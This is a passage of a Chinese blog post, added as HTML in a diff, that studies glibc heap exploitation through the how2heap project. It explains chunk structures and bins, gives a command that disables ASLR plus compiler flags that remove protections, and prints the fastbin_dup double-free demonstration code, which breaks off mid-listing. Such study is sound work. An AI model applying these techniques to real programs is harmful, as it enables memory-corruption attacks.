@@ -1,0 +1,690 @@
+<!doctype html><html lang=zh-cn data-theme=dark><head><meta charset=utf-8><meta name=viewport content="width=device-width"><meta name=theme-color content="#222" media="(prefers-color-scheme: dark)"><meta name=generator content="Hugo 0.111.3"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icont.png><meta itemprop=name content="how2heap全系列（持续更新）"><meta itemprop=description content="记录how2heap学习的过程"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://izeroo.cn/imgs/avatar.jpg"><meta itemprop=keywords content="PWN,how2heap"><meta property="og:type" content="article"><meta property="og:title" content="how2heap全系列（持续更新）"><meta property="og:description" content="记录how2heap学习的过程"><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://izeroo.cn/post/how2heap.html"><meta property="og:site_name" content="Zero's Record"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="Zero"><meta property="article:published_time" content="2022-11-22 22:23:00 +0800 CST"><meta property="article:modified_time" content="2023-04-24 23:13:47 +0800 CST"><link type=text/css rel=stylesheet href=https://unpkg.com/@fortawesome/fontawesome-free@6.1.2/css/all.min.css><link type=text/css rel=stylesheet href=https://unpkg.com/animate.css@3.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://unpkg.com/viewerjs@1.11.0/dist/viewer.min.css><link rel=stylesheet href=/css/main.min.fbdf2d7a7a7b64fd23bcb27e5c61762041e08c9eeb5a68d056f3b66bf87bd926.css><style type=text/css>.post-footer,.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script class=next-config data-name=page type=application/json>{"comments":true,"isHome":false,"isPage":true,"path":"how2heap.html","permalink":"https://izeroo.cn/post/how2heap.html","title":"how2heap全系列（持续更新）","waline":{"js":[{"alias":"waline","alias_name":"@waline/client","file":"dist/pageview.js","name":"pageview","version":"2.13.0"},{"alias":"waline","alias_name":"@waline/client","file":"dist/comment.js","name":"comment","version":"2.13.0"}]}}</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>how2heap全系列（持续更新） - Zero's Record</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>Zero's Record</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>记录值得记录的事情</p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about.html class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/archives/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
+<span class=badge>16</span></a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
+<span class=toggle-line></span>
+<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#first-fit>first fit</a></li><li><a href=#calc_tcache_idx><strong>calc_tcache_idx</strong></a></li><li><a href=#fastbin_dup>fastbin_dup</a></li><li><a href=#fastbin_dup_into_stack><strong>fastbin_dup_into_stack</strong></a></li><li><a href=#fastbin_dup_consolidate>fastbin_dup_consolidate</a></li><li><a href=#unsafe_unlink>unsafe_unlink</a></li><li><a href=#house_of_spirit>house_of_spirit</a></li><li><a href=#poison_null_byte>poison_null_byte</a></li><li><a href=#house_of_lore>house_of_lore</a></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=Zero src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>Zero</p><div class=site-description itemprop=description>...</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>16</span>
+<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>6</span>
+<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>18</span>
+<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/izeroo title="Github → https://github.com/izeroo" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
+Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
+友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://gitee.com/hugo-next/hugo-theme-next title=https://gitee.com/hugo-next/hugo-theme-next target=_blank>Hugo-NexT</a></li><li class=links-of-blogroll-item><a href=https://lisenhui.cn title=https://lisenhui.cn target=_blank>凡梦星尘空间站</a></li><li class=links-of-blogroll-item><a href=https://lemono.fun title=https://lemono.fun target=_blank>Lemono</a></li><li class=links-of-blogroll-item><a href=http://yuno0n.top title=http://yuno0n.top target=_blank>Yunoon</a></li><li class=links-of-blogroll-item><a href=https://momoe.ml title=https://momoe.ml target=_blank>Zy143L</a></li><li class=links-of-blogroll-item><a href=https://9bingyin.com title=https://9bingyin.com target=_blank>Bingyin</a></li><li class=links-of-blogroll-item><a href=https://www.tangrr.top title=https://www.tangrr.top target=_blank>皮皮</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
+<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate=2018-08-27T17:32:11+08:00></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=28833></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=67></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate=2023-11-14T22:56:00+08:00></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-comments class="button goto-comments" title=直达评论><i class="fas fa-comments"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
+<span>0%</span></div></div><div class=reading-progress-bar></div><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://izeroo.cn/post/how2heap.html><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Zero"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Zero"><meta itemprop=description content="..."></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="how2heap全系列（持续更新）"><meta itemprop=description content="记录how2heap学习的过程"></span><header class=post-header><h1 class=post-title itemprop="name headline">how2heap全系列（持续更新）</h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="far fa-calendar"></i></span>
+<span class=post-meta-item-text title=发表于>发表于：</span>
+<time title="创建时间：2022-11-22 22:23:00 +0800 CST" itemprop="dateCreated datePublished" datetime="2022-11-22 22:23:00 +0800 CST">2022-11-22</time></span>
+<span class=post-meta-item><span class=post-meta-item-icon><i class="far fa-calendar-check"></i></span>
+<span class=post-meta-item-text title=更新于>更新于：</span>
+<time title=修改时间：2023-04-24T23:13:47+08:00 itemprop=dateModified datetime=2023-04-24T23:13:47+08:00>2023-04-24</time></span>
+<span class=post-meta-item><span class=post-meta-item-icon><i class="far fa-folder-open"></i></span>
+<span class=post-meta-item-text title=分类于>分类于：</span>
+<span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/pwn itemprop=url rel=index><span itemprop=name>PWN</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="far fa-file-word"></i></span>
+<span class=post-meta-item-text>字数：</span>
+<span>8853</span></span>
+<span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="far fa-clock"></i></span>
+<span class=post-meta-item-text>阅读：&ap;</span>
+<span>18分钟</span></span>
+<span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="far fa-eye"></i></span>
+<span class=post-meta-item-text>浏览：</span>
+<span id=busuanzi_value_page_pv data-path=/post/how2heap.html><i class="fa fa-sync fa-spin"></i></span></span>
+<span class=post-meta-item title><span class=post-meta-item-icon><i class="far fa-comments"></i></span>
+<span class=post-meta-item-text title=评论>评论：</span>
+<span id=comments-count class=waline-comment-count data-path=/post/how2heap.html><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><p>在此记录学习how2heap的过程。感谢shellphish的
+<a href=https://github.com/shellphish/how2heap title=how2heap rel="noopener external nofollow noreferrer" target=_blank class=exturl>how2heap
+<i class="fa fa-external-link-alt"></i></a> 项目。</p><p>本文基于commit
+<a href=https://github.com/shellphish/how2heap/tree/b4e4e487fd913d072b616713feb9f5e7a1e53873 title=" b4e4e487fd913d072b616713feb9f5e7a1e53873 " rel="noopener external nofollow noreferrer" target=_blank class=exturl>b4e4e487fd913d072b616713feb9f5e7a1e53873
+<i class="fa fa-external-link-alt"></i>
+</a>，glibc 2.36，相比于之前的版本代码可能会复杂一点。</p><p>需要的前置知识：</p><ol><li><p>csapp malloc lab ：对内存管理的理解有很大的帮助</p></li><li><p>glibc的ptmalloc的大概了解 需要知道chunk的结构，针对不同大小的chunk有哪些管理方式</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  This struct declaration is misleading (but accurate and necessary).
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  It declares a &#34;view&#34; into memory allowing access to necessary
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  fields at known offsets from a given base. See explanation below.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> malloc_chunk {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  INTERNAL_SIZE_T      prev_size;  <span style=color:#75715e>/* Size of previous chunk (if free).  */</span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// 如果前一个 chunk 是空闲的，该域表示前一个 chunk 的大小，如果前一个 chunk 不空闲，该域无意义。
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  INTERNAL_SIZE_T      size;       <span style=color:#75715e>/* Size in bytes, including overhead. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// 当前 chunk 的大小，并且记录了当前 chunk 和前一个 chunk 的一些属性性，包括前一个 chunk 是否在 
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// 使用中，当前 chunk 是否是通过 mmap 获得的内存，当前 chunk 是否属于非主分配区。
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> malloc_chunk<span style=color:#f92672>*</span> fd;         <span style=color:#75715e>/* double links -- used only if free. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> malloc_chunk<span style=color:#f92672>*</span> bk;
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  指针 fd 和 bk 只有当该 chunk 块空闲时才存在，其作用是用于将对应的空闲 chunk 块加入到
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  空闲 chunk 块链表中统一管理，如果该 chunk 块被分配给应用程序使用，那么这两个指针
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  也就没有用（该 chunk 块已经从空闲链中拆出）了，所以也当作应用程序的使用空间，而不至于浪费。
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Only used for large blocks: pointer to next larger size.  */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> malloc_chunk<span style=color:#f92672>*</span> fd_nextsize; <span style=color:#75715e>/* double links -- used only if free. */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> malloc_chunk<span style=color:#f92672>*</span> bk_nextsize;
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  当当前的 chunk 存在于 large bins 中时，large bins 中的空闲
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  chunk 是按照大小排序的，但同一个大小的 chunk 可能有多个，增加了这两个字段可以加快
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  遍历空闲 chunk，并查找满足需要的空闲 chunk，fd_nextsize 指向下一个比当前 chunk 大小
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  大的第一个空闲 chunk，bk_nextszie 指向前一个比当前 chunk 大小小的第一个空闲 chunk。
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  如果该 chunk 块被分配给应用程序使用，那么这两个指针也就没有用（该 chunk 块已经从 size
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  链中拆出）了，所以也当作应用程序的使用空间，而不至于浪费。
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  */</span>
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>注释参考了《Glibc 内存管理 Ptmalloc2 源代码分析 华庭（庄明强）》</p><p>注意chunk结构体的成员，低位在低地址，高位在高地址</p></li><li><p>分箱式内存管理</p><blockquote><p>对于空闲的 chunk，ptmalloc 采用分箱式内存管理方式，根据空闲 chunk 的大小和处于
+的状态将其放在四个不同的 bin 中，这四个空闲 chunk 的容器包括 fast bins，unsorted bin，small bins 和 large bins。</p><p>Fast bins 是小内存块的高速缓存，当一些大小小于 64 字节的 chunk被回收时，首先会放入 fast bins 中，在分配小内存时，首先会查看 fast bins 中是否有合适的内存块，如果存在，则直接返回 fast bins 中的内存块，以加快分配速度。</p><p>Usorted bin 只有一个，回收的 chunk 块必须先放到 unsorted bin 中，分配内存时会查看 unsorted bin 中是否有合适的 chunk，如果找到满足条件的 chunk，则直接返回给用户，否则将 unsorted bin 的所有 chunk 放入 small bins 或是 large bins 中。</p><p>Small bins 用于存放固定大小的 chunk，共 64 个bin，最小的 chunk 大小为 16 字节或 32 字节，每个 bin 的大小相差 8 字节或是 16 字节，当分配小内存块时，采用精确匹配的方式从 small bins 中查找合适的 chunk。</p><p>Large bins 用于存储大于等于 512B 或 1024B 的空闲 chunk，这些 chunk 使用双向链表的形式按大小顺序排序，分配内存时按最近匹配方式从 large bins 中分配 chunk。</p></blockquote></li><li><p>编译选项</p><p>在学习的时候可以关闭ASLR、PIE等，这样每次运行的结果都是一样，容易复现，另外编译使用<code>-g</code>选项来使gdb可以显示源码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span># sysctl -w kernel.randomize_va_space=0
+</span></span><span style=display:flex><span>$ gcc xxx.c -o xx -O0 -g -z execstack -z norelro -fno-stack-protector -no-pie
+</span></span></code></pre></div></li></ol><h2 id=first-fit>first fit
+<a class=header-anchor href=#first-fit></a></h2><p><code>This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.</code></p><p>first fit并不是一种利用方式，而是介绍glibc的选择空闲块的策略。</p><p>glibc使用first-fit的策略选择空闲块，遍历chunk列表时，如果一个chunk是free的而且满足大小要求，glibc就会选择这个块。</p><p>代码请见
+<a href=https://github.com/shellphish/how2heap/blob/master/first_fit.c title="how2heap/first_fit.c at master · shellphish/how2heap (github.com)" rel="noopener external nofollow noreferrer" target=_blank class=exturl>how2heap/first_fit.c at master · shellphish/how2heap (github.com)
+<i class="fa fa-external-link-alt"></i></a></p><p><img src=/imgs/img-lazy-loading.gif data-src=image-20230318212704999.png alt=image-20230318212704999></p><p>运行结果可以验证这一点。</p><h2 id=calc_tcache_idx><strong>calc_tcache_idx</strong>
+<a class=header-anchor href=#calc_tcache_idx></a></h2><p><code>This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size.</code></p><p>和上面的一样，这里给出了计算chunk位于tcache的index的方式。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span>The basic formula is as follows:
+</span></span><span style=display:flex><span>	IDX <span style=color:#f92672>=</span> (CHUNKSIZE <span style=color:#f92672>-</span> MINSIZE <span style=color:#f92672>+</span> MALLOC_ALIGNMENT <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>/</span> MALLOC_ALIGNMENT
+</span></span><span style=display:flex><span>	On a <span style=color:#ae81ff>64</span> bit system the current values are:
+</span></span><span style=display:flex><span>		MINSIZE: <span style=color:#ae81ff>0x20</span>
+</span></span><span style=display:flex><span>		MALLOC_ALIGNMENT: <span style=color:#ae81ff>0x10</span>
+</span></span><span style=display:flex><span>	So we get the following equation:
+</span></span><span style=display:flex><span>	IDX <span style=color:#f92672>=</span> (CHUNKSIZE <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x11</span>) <span style=color:#f92672>/</span> <span style=color:#ae81ff>0x10</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>BUT be AWARE that CHUNKSIZE is not the x in <span style=color:#a6e22e>malloc</span>(x)
+</span></span><span style=display:flex><span>It is calculated as follows:
+</span></span><span style=display:flex><span>	IF x <span style=color:#f92672>+</span> SIZE_SZ <span style=color:#f92672>+</span> MALLOC_ALIGN_MASK <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>MINSIZE</span>(<span style=color:#ae81ff>0x20</span>) CHUNKSIZE <span style=color:#f92672>=</span> <span style=color:#a6e22e>MINSIZE</span> (<span style=color:#ae81ff>0x20</span>)
+</span></span><span style=display:flex><span>	ELSE: CHUNKSIZE <span style=color:#f92672>=</span> (x <span style=color:#f92672>+</span> SIZE_SZ <span style=color:#f92672>+</span> MALLOC_ALIGN_MASK) <span style=color:#f92672>&amp;</span> <span style=color:#f92672>~</span>MALLOC_ALIGN_MASK) 
+</span></span><span style=display:flex><span>	<span style=color:#f92672>=&gt;</span> CHUNKSIZE <span style=color:#f92672>=</span> (x <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xf</span>) <span style=color:#f92672>&amp;</span> <span style=color:#f92672>~</span><span style=color:#ae81ff>0xf</span>
+</span></span></code></pre></div><h2 id=fastbin_dup>fastbin_dup
+<a class=header-anchor href=#fastbin_dup></a></h2><p><code>Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist.</code></p><p>一个double-free的例子，连续malloc A、B、C 3个堆块，然后按顺序free A、B、A，然后调用3次malloc，结果会返回A、B、A这3个堆块。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;assert.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>setbuf</span>(stdout, NULL);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;This file demonstrates a simple double-free attack with fastbins.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Fill up tcache first.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>ptrs[<span style=color:#ae81ff>8</span>];
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>8</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>		ptrs[i] <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(<span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>; i<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>7</span>; i<span style=color:#f92672>++</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>free</span>(ptrs[i]);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Allocating 3 buffers.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>a <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>b <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>c <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;1st calloc(1, 8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;2nd calloc(1, 8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, b);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;3rd calloc(1, 8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, c);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Freeing the first one...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>free</span>(a);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;If we free %p again, things will crash because %p is at the top of the free list.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a, a);
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// free(a);
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;So, instead, we&#39;ll free %p.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, b);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>free</span>(b);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Now, we can free %p again, since it&#39;s not the head of the free list.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>free</span>(a);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#39;ll get %p twice!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a, b, a, a);
+</span></span><span style=display:flex><span>	a <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>	b <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>	c <span style=color:#f92672>=</span> <span style=color:#a6e22e>calloc</span>(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>8</span>);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;1st calloc(1, 8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, a);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;2nd calloc(1, 8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, b);
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;3rd calloc(1, 8): %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, c);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>assert</span>(a <span style=color:#f92672>==</span> c);
